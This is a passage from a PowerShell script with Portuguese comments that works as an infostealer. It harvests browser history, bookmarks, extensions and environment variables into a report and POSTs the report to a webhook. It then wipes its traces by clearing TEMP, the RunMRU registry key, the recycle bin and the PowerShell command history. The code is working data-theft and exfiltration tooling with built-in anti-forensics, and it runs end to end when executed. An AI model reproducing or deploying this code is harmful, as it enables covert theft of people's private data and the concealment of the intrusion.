                            $json = Get-Content -Path $bookmark -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
                            $walkBookmark = {
                                param($node)
                                if($node.children) {
                                    foreach($child in $node.children) {
                                        if($child.type -eq 'url') { & $add "  - $($child.name) | $($child.url)" }
                                        if($child.children) { & $walkBookmark $child }
                                    }
                                }
                            }
                            if($json.roots) {
                                foreach($root in $json.roots.PSObject.Properties) {
                                    if($root.Value) { & $walkBookmark $root.Value }
                                }
                            }
                        } catch { & $add '  [não foi possível interpretar o arquivo de favoritos]' }
                    }

                    $extRoot = Join-Path $profile.FullName 'Extensions'
                    if(Test-Path -Path $extRoot -PathType Container) {
                        & $add ''; & $add 'EXTENSÕES / PLUGINS:'
                        $extensions = & $try { Get-ChildItem $extRoot -Directory -ErrorAction Stop }
                        foreach($ext in $extensions) {
                            $manifest = & $try { Get-ChildItem $ext.FullName -Filter manifest.json -Recurse -File -ErrorAction Stop | Select-Object -First 1 }
                            if($manifest) {
                                try {
                                    $m = Get-Content -Path $manifest.FullName -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
                                    $name = $m.name
                                    if($name -and $name -match '^__MSG_'){ $name = $ext.Name }
                                    & $add "  - $name | Versão: $($m.version) | ID: $($ext.Name)"
                                } catch { & $add "  - ID: $($ext.Name)" }
                            } else { & $add "  - ID: $($ext.Name)" }
                        }
                    }
                }
            } else {
                $profiles = & $try { Get-ChildItem $browser.UserRoot -Directory -ErrorAction Stop | Sort-Object Name }
                foreach($profile in $profiles) {
                    & $add ''; & $add "PERFIL: $($profile.Name)"
                    $places = Join-Path $profile.FullName 'places.sqlite'
                    if(Test-Path -Path $places -PathType Leaf) {
                        if($sqliteType) {
                            $q = @"
SELECT
    moz_places.url AS URL,
    moz_places.title AS Titulo,
    datetime(moz_historyvisits.visit_date/1000000,'unixepoch','localtime') AS Data
FROM moz_historyvisits
JOIN moz_places ON moz_historyvisits.place_id=moz_places.id
ORDER BY moz_historyvisits.visit_date DESC
LIMIT $BrowserEntries
"@
                            $hist = & $invokeBrowserSQLite $places $q
                            & $add 'HISTÓRICO DE NAVEGAÇÃO:'
                            if($hist) { $hist | ForEach-Object { & $add "  - $($_.Data) | $($_.Titulo) | $($_.URL)" } }
                            else { & $add '  [histórico localizado, mas não foi possível consultar o banco]' }

                            $q = @"
SELECT
    b.title AS Titulo,
    p.url AS URL
FROM moz_bookmarks b
JOIN moz_places p ON b.fk=p.id
WHERE b.type=1
ORDER BY b.dateAdded DESC
LIMIT $BrowserEntries
"@
                            $fav = & $invokeBrowserSQLite $places $q
                            & $add ''; & $add 'FAVORITOS:'
                            if($fav) { $fav | ForEach-Object { & $add "  - $($_.Titulo) | $($_.URL)" } }
                            else { & $add '  [nenhum favorito localizado]' }
                        } else { & $add '  [SQLite não disponível]' }
                    }

                    $addons = Join-Path $profile.FullName 'extensions.json'
                    if(Test-Path -Path $addons -PathType Leaf) {
                        & $add ''; & $add 'EXTENSÕES / PLUGINS:'
                        try {
                            $j = Get-Content -Path $addons -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json
                            if($j.addons) {
                                $j.addons | Where-Object { $_.active -or $_.userDisabled -eq $false } | ForEach-Object {
                                    & $add "  - $($_.defaultLocale.name) | Versão: $($_.version) | ID: $($_.id)"
                                }
                            }
                        } catch { & $add '  [não foi possível interpretar extensions.json]' }
                    }
                }
            }
        }

        # =====================================================================
        # 13. AMBIENTE
        # =====================================================================
        & $sec '## 13. AMBIENTE'
        foreach($n in 'PATH','APPDATA','PROGRAMDATA','SYSTEMDRIVE','SYSTEMROOT','TEMP','TMP','USERNAME','COMPUTERNAME') {
            $v = [Environment]::GetEnvironmentVariable($n)
            if($v) {
                $v = if($v.Length -gt 80){ $v.Substring(0,40)+'...'+$v.Substring($v.Length-30) } else { $v }
                & $add "  $n = $v"
            }
        }

        & $add ''; & $add $sep; & $add 'FIM DO RELATÓRIO'; & $add $sep

        if(-not $ExportDir) { $ExportDir = Split-Path -Path $OutputFile -Parent }
        if($ExportDir -and -not (Test-Path -Path $ExportDir -PathType Container)) {
            New-Item -Path $ExportDir -ItemType Directory -Force -ErrorAction Stop | Out-Null
        }

        $outputParent = Split-Path -Path $OutputFile -Parent
        if($outputParent -and -not (Test-Path -Path $outputParent -PathType Container)) {
            New-Item -Path $outputParent -ItemType Directory -Force -ErrorAction Stop | Out-Null
        }

        $sb.ToString() | Out-File -Path $OutputFile -Encoding UTF8 -Force -ErrorAction Stop
        Write-Host "Relatório salvo em: $OutputFile"
        return $OutputFile
    }
    catch {
        Write-Error "Falha ao gerar/salvar relatório em '$OutputFile': $($_.Exception.Message)"
        return $null
    }
    finally {
        $ErrorActionPreference = $oldErrorActionPreference
    }
}


##############################################################################

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%

        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,                   # URL do webhook para onde enviar

        [string]$Titulo = [System.IO.Path]::GetFileName($FilePath), # parâmetro de título com fallback para o nome do arquivo

        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
    )

    # Resolve o caminho do arquivo
    $resolvedPath = $null
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
        if (Test-Path -Path $FilePath -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
        } else {
            throw "Arquivo informado não existe: $FilePath"
        }
    } else {
        $candidate1 = Join-Path $env:TEMP $FilePath
        $candidate2 = Join-Path $ExportDir $FilePath

        if (Test-Path -Path $candidate1 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
        } else {
            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
        }
    }

    # Envia e apaga o arquivo após envio
    try {
        # Lê o conteúdo do arquivo
        $fileContent = Get-Content -Path $resolvedPath -Raw -Encoding UTF8

        # Monta a string no formato "Titulo: conteudo"
        $payloadText = "${Titulo}: ${fileContent}"

        # Converte a string montada para bytes UTF-8
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payloadText)

        # Envia a requisição
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'

        # Remove o arquivo após envio
        if (Test-Path -Path $resolvedPath) {
            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
    } finally {
        # Remove exportdir apenas se solicitado explicitamente
        try {
            if ($RemoveExportDir.IsPresent) {
                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Verbose "Falha ao remover pasta de exportação: $_"
        }
    }

    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date); Titulo = $Titulo }
}


######### Chama a funcao e salva o arquivo $OutFile em $ExportDir #########
function Invoke-DataDump {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [scriptblock]$DumpCommand,

        [Parameter(Mandatory = $true)]
        [string]$OutputFile,

        [Parameter(Mandatory = $false)]
        [string]$ExportDir
    )

    try {
        # Executa o comando passado via ScriptBlock
        $out = &$DumpCommand

        # Se o comando não retornar o caminho em texto, usa o OutputFile
        if ([string]::IsNullOrWhiteSpace($out)) {
            $out =$OutputFile
        }

        Write-Host "Arquivo gerado em: $out"
        return $out
    } catch {
        Write-Error "Erro ao gerar arquivo: $_"
        exit 1
    }
}


####### Enviar ao Webhook ######
function Send-DumpToWebhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$FilePath,

        [Parameter(Mandatory = $false)]
        [string]$WebhookUrl,

        [Parameter(Mandatory = $false)]
        [string]$Title = "Relatório de Dump",

        [Parameter(Mandatory = $false)]
        [string]$ExportDir,

        [Parameter(Mandatory = $false)]
        [switch]$RemoveExportDir
    )

    # Executa apenas se a URL do Webhook for informada
    if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
        try {
            Write-Host "Enviando para webhook: $WebhookUrl"

            # Monta os parâmetros dinamicamente (Splatting)
            $splatParams = @{
                FilePath   = $FilePath
                WebhookUrl = $WebhookUrl
                Titulo     = $Title
            }

            if ($ExportDir) { $splatParams['ExportDir'] =$ExportDir }
            if ($RemoveExportDir) { $splatParams['RemoveExportDir'] =$true }

            # Executa a função interna de envio
            $sendResult = send_file_to_webhook @splatParams

            # Exibe o resultado checando o retorno do objeto
            if ($null -ne $sendResult) {$fileSent = if ($sendResult.PSObject.Properties['FileSent']) {$sendResult.FileSent } else { $FilePath }$timeSent = if ($sendResult.PSObject.Properties['Time']) {$sendResult.Time } else { (Get-Date) }

                Write-Host "Envio concluído: $fileSent em$timeSent"
            } else {
                Write-Host "Envio concluído com sucesso."
            }
        } catch {
            Write-Error "Erro durante envio para webhook: $_"
        }
    }
}

  

##### Funcao de Limpeza ####
function Clear-All {
    $ea = 'SilentlyContinue'
    rm "$env:TEMP\*" -r -fo -ea $ea
    rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
    Clear-RecycleBin -fo -ea $ea
    rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
    echo "Limpeza concluída!"
}

#### Executa ####
$dumpParams = @{
    DumpCommand = { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault }
    OutputFile  = $OutputFileDefault
    ExportDir   = $ExportDirDefault
}
$out = Invoke-DataDump @dumpParams

#### Envia
$webhookParams = @{
    FilePath        = $out
    WebhookUrl      = $WebhookUrl
    Title           = "System Info"
    ExportDir       = $ExportDirDefault
    RemoveExportDir = $true
}
Send-DumpToWebhook @webhookParams

Clear-All


